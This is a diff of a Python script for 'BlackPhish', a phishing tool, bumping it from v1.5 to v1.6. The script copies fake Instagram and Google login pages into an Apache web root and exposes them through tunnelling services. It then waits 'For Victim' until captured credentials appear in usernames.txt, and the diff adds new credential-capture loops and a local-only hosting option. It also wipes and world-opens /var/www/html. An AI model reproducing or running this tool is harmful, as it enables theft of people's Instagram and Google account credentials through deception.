@@ -10,9 +10,10 @@
 
 
 
-# version 1.5: - Added localhost.run
+# version 1.6: - Added localhost only - Some touch ups
 
 # Please update version number each time we update
+
 
 
 # Libraries #
@@ -76,7 +77,7 @@ def warning(): # Banner #
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v1.5
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v1.6
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -103,7 +104,7 @@ def checkInternet(): # Checks for internet connection #
         print(red + "[!] Internet Not Found" + reset)
         exit(0)
     
-# Port forward to serveo #
+# Port forward to Serveo #
 def serveoForward():
     print(yellow + ' If prompt about RSA key, say yes' + green)
     sleep(2)
@@ -150,7 +151,7 @@ def banner():
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v1.6
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -164,7 +165,9 @@ def banner():
                     
                     
         [1]\033[94;1m Instagram \033[91;1m
-        [2]\033[94;1m Google
+        [2]\033[94;1m Google \033[91;1m
+        [0]\033[94;1m Clean \033[91;1m
+        [x]\033[94;1m Exit
         
         
         \033[0m''')
@@ -195,8 +198,13 @@ def main():
         print('\n')
         print(red + '           [1]' + blue + ' Serveo (recommended)')
         print(red + '           [2]' + blue + ' Localtunnel')
-        print(red + '           [3]' + blue + ' localhost.run\n\n')
-        choice1 = input(red + "        [BlackPhish] -> ")
+        print(red + '           [3]' + blue + ' localhost.run')
+        print(red + '           [4]' + blue + ' Localhost only\n\n')
+        choice1 = input(red + "        [BlackPhish-Google] -> ")
+        
+        
+        
+        # If select Instagram #
         
         if choice1 == '1':
             system("clear")
@@ -220,7 +228,7 @@ def main():
             system('service apache2 start') # Starts apache2 service #
             print(green + '[+] Apache2 Service Started')
             sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip) # Shows where site is hosted locally #
+            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Serveo')
             serveoForward() # Serveo port forward line:109 #
@@ -258,7 +266,7 @@ def main():
             system('service apache2 start') # Starts apache2 service #
             print(green + '[+] Apache2 Service Started')
             sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip) # Shows where site is hosted locally #
+            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localtunnel')
             localTunnel() # Localtunnel port forward line:112 #
@@ -296,10 +304,44 @@ def main():
             system('service apache2 start') # Starts apache2 service #
             print(green + '[+] Apache2 Service Started')
             sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip) # Shows where site is hosted locally #
+            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localhost.run')
-            localhost() # Localhost.run port forward line:114 #
+            localhost() # Localhost.run port forward line:114 #Instagram
+            while True: # Waits for content on usernames.txt #
+                with open('/var/www/html/usernames.txt') as creds:
+                    lines = creds.read().rstrip()
+                    if len(lines) != 0:
+                        print(green + "______________________________________________________________________________\n")
+                        print('\n                CREDENTIALS FOUND\n\n')
+                        system("cat /var/www/html/usernames.txt")
+                        print("\n______________________________________________________________________________" + reset)
+                        endMessage()
+                        
+        elif choice1 == '4':
+            system("clear")
+            print(green + '[+] Copying Files')
+            sleep(0.1)
+            print(green + '[+] Cleaning /var/www/html/')
+            sleep(0.1)
+            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
+            print(green + '[+] Cleaning /Server/www/')
+            sleep(0.1)
+            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
+            copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
+            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            print(green + '[+] Coping to /var/www/html')
+            sleep(0.1)
+            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
+            print(green + '[+] Changing File Permissions')
+            sleep(0.1)
+            print(yellow + '[+] Starting Apache2 Service')
+            sleep(0.1)
+            system('service apache2 start') # Starts apache2 service #
+            print(green + '[+] Apache2 Service Started')
+            sleep(0.1)
+            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
+            sleep(0.1)
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True: # Waits for content on usernames.txt #
@@ -316,13 +358,18 @@ def main():
             print(red + '[!] Invalid Option')
             sleep(1)
             main()
-        
+
+
+
+    # If select Google #
+
     elif choice == '2':
         print('\n')
         print(red + '           [1]' + blue + ' Serveo (recommended)')
         print(red + '           [2]' + blue + ' Localtunnel')
-        print(red + '           [3]' + blue + ' localhost.run\n\n')
-        choice1 = input(red + "        [BlackPhish] -> ")
+        print(red + '           [3]' + blue + ' localhost.run')
+        print(red + '           [4]' + blue + ' Localhost only\n\n')
+        choice1 = input(red + "        [BlackPhish-Google] -> ")
         
         if choice1 == '1':
             system("clear")
@@ -334,7 +381,7 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
+            copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
             copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Coping to /var/www/html')
             sleep(0.1)
@@ -346,7 +393,7 @@ def main():
             system('service apache2 start') # Starts apache2 service #
             print(green + '[+] Apache2 Service Started')
             sleep(0.1)
-            print(yellow + "\n[*] Local hosted: " + green + localip) # Shows where site is hosted locally #
+            print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Serveo')
             serveoForward() # Serveo port forward line:109 #
@@ -372,7 +419,7 @@ def main():
             print(green + '[+] Cleaning /Server/www/') 
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
+            copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
             copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Coping to /var/www/html')
             sleep(0.1)
@@ -384,7 +431,7 @@ def main():
             system('service apache2 start') # Starts apache2 service #
             print(green + '[+] Apache2 Service Started')
             sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip) # Shows where site is hosted locally #
+            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localtunnel')
             localTunnel() # Localtunnel port forward line:112 #
@@ -410,7 +457,7 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
+            copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
             copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Coping to /var/www/html')
             sleep(0.1)
@@ -422,10 +469,45 @@ def main():
             system('service apache2 start') # Starts apache2 service #
             print(green + '[+] Apache2 Service Started')
             sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip) # Shows where site is hosted locally #
+            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localhost.run')
             localhost() # Localhost.run port forward line:114 #
+            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
+            sleep(0.1)
+            while True: # Waits for content on usernames.txt #
+                with open('/var/www/html/usernames.txt') as creds:
+                    lines = creds.read().rstrip()
+                    if len(lines) != 0:
+                        print(green + "______________________________________________________________________________\n")
+                        print('\n                CREDENTIALS FOUND\n\n')
+                        system("cat /var/www/html/usernames.txt")
+                        print("\n______________________________________________________________________________" + reset)
+                        endMessage()
+        elif choice1 == '4':
+            system("clear")
+            print(green + '[+] Copying Files')
+            sleep(0.1)
+            print(green + '[+] Cleaning /var/www/html/')
+            sleep(0.1)
+            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
+            print(green + '[+] Cleaning /Server/www/')
+            sleep(0.1)
+            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
+            copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
+            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            print(green + '[+] Coping to /var/www/html')
+            sleep(0.1)
+            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
+            print(green + '[+] Changing File Permissions')
+            sleep(0.1)
+            print(yellow + '[+] Starting Apache2 Service')
+            sleep(0.1)
+            system('service apache2 start') # Starts apache2 service #
+            print(green + '[+] Apache2 Service Started')
+            sleep(0.1)
+            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
+            sleep(0.1)
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True: # Waits for content on usernames.txt #
@@ -444,7 +526,7 @@ def main():
             main()
 
     # Clean out everything #
-    elif choice == "clean":
+    elif choice == "0":
         print(green + '[+] Stopping Apache2 Service')
         system('service apache2 stop') # Stops apache2 service #
         print(green + '[+] Stopping Traffic forwarding to serveo')
@@ -457,7 +539,7 @@ def main():
         main()
     
     # Exit #
-    elif choice == 'exit':
+    elif choice == 'x':
         endMessage()
 
     # Invalid Option Error #
